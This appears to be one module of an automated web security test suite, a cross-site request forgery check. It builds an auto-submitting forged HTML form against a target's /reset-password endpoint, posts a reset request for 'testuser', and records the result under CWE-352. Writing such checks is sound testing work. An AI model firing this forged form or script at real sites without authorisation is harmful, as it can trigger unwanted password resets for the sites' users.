import requests

from attack_suite.result_schema import AttackResult


def run(target_url: str) -> AttackResult:
    forged_html = (
        '<form id="f" action="{}/reset-password" method="POST">'
        '<input name="username" value="testuser"></form>'
        '<script>document.getElementById("f").submit();</script>'
    ).format(target_url)

    response = requests.post(
        f"{target_url}/reset-password",
        data={"username": "testuser"},
        timeout=5,
        allow_redirects=True,
    )
    vulnerable = response.status_code < 400 and "csrf" not in response.text.lower()

    return AttackResult(
        attack_name="CSRF Forgery",
        target=target_url,
        vulnerable=vulnerable,
        evidence=f"status={response.status_code}; poc={forged_html}",
        severity="Medium",
        cwe_id="CWE-352",
    )
